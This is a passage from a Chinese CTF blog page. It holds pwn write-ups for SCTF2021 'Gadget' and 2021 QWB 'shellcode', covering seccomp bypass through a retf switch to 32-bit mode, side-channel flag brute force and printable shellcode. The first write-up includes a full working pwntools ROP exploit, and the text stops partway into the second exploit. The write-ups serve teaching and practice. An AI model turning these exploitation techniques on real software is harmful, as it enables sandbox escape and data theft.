<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>杂题录 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="有意思的题目">
<meta property="og:type" content="article">
<meta property="og:title" content="杂题录">
<meta property="og:url" content="https://ixout.github.io/posts/4584/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="有意思的题目">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c6d6.jpg">
<meta property="article:published_time" content="2023-12-11T13:13:24.000Z">
<meta property="article:modified_time" content="2024-11-20T14:11:46.246Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="杂题">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c6d6.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/4584/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '杂题录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-20 22:11:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c6d6.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">杂题录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-11T13:13:24.000Z" title="发表于 2023-12-11 21:13:24">2023-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-20T14:11:46.246Z" title="更新于 2024-11-20 22:11:46">2024-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>52分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SCTF2021-Gadget"><a href="#SCTF2021-Gadget" class="headerlink" title="SCTF2021 Gadget"></a>SCTF2021 Gadget</h1><p><strong>标签:retf|侧信道攻击|沙盒</strong></p>
<p>程序是静态链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
<p>程序有seccomp只允许三个系统调用</p>
<p>传统的orw,因为只有<code>read</code>，<code>open</code>和<code>write</code>都被禁用而无法使用。</p>
<p>再回到程序本身程序读取时存在栈溢出,这是主要的漏洞点</p>
<p>不过可以观察到沙盒并没有限制系统的ARCH,同时fstat的系统调用号在32位中恰好是open的系统调用</p>
<p>搜索gadget,可以发现存在retf,retf可以用来切换32位模式(ropper搜索并没有找到这个gadget,但ROPgadget找到了,ropper也可以找到不过要用—instructions选项,因此找gadget还是要小心一点)</p>
<p>此时open的问题解决了,但还有一个问题,就是程序没有输出,一个可行的方案是采用侧信道的方式逐个输出</p>
<blockquote>
<p>侧信道攻击：在程序无法回显时，通过程序反馈的信息对进行flag逐位爆破。</p>
</blockquote>
<p>恰好程序中有这么一段gadget</p>
<p><code>cmp byte ptr [rax - 0x46], cl; push rbp; ret 0x5069;</code></p>
<p>和一段无限循环的代码</p>
<p><code>.text:0000000000405837 EB FE                         jmp     short loc_405837</code></p>
<p>用这两部分代码来探测是否爆破成功</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span> <span class="comment"># call -&gt; push + jmp</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> <span class="comment"># mov edi,...</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_addr = <span class="number">0x4011ed</span></span><br><span class="line">cmp_addr = <span class="number">0x408266</span> <span class="comment"># cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069</span></span><br><span class="line">jnz_addr = <span class="number">0x405831</span> <span class="comment"># jnz  0x405837</span></span><br><span class="line">loop = <span class="number">0x405837</span> <span class="comment"># jmp  0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">index, char</span>):</span><br><span class="line">	payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">	payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">	payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">	io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">	payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">	payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(retf_addr) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">	payload += p32(retf_addr) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">	payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">	payload += p64(pop_rbp_ret) + p64(jnz_addr)</span><br><span class="line">	payload += p64(cmp_addr)</span><br><span class="line">	io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pos = <span class="number">0</span></span><br><span class="line">	flag = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">			io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">			pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">				io.close()</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				flag += i</span><br><span class="line">				<span class="built_in">print</span>(flag)</span><br><span class="line">				io.close()</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		pos = pos + <span class="number">1</span></span><br><span class="line">	success(flag)</span><br></pre></td></tr></table></figure>
<p>当爆破成功时,程序就会段错误,那么调用recv时就会立即捕获到错误,以此判断成功</p>
<p>当爆破失败时,程序就会进入无限循环,从而自行结束开始下一次运行</p>
<h1 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯 shellcode"></a>2021强网杯 shellcode</h1><p><strong>标签:retf|侧信道攻击|沙盒|可见字符shellcode|SMC</strong></p>
<p>这一题与上一题一个套路</p>
<p>程序就只由一段代码构成,看来应该是手搓的elf</p>
<p>开启了沙盒只允许有限几个系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p>程序执行的内容很简单</p>
<p>mmap分配一块rwx的内存,向其中读入数据作为shellcode运行</p>
<p>不过限制读入的shellcode必须要由可见字符构成,这个限制就使得很多汇编代码无法使用,包括syscall等等,可以使用smc绕过</p>
<p>延续上一题的思路需要使用retf,但是这题与上一题不同在于其没有bss段,所以在切换系统宽度时会出错</p>
<p>这时候可以自己指定地址mmap一块内存</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span 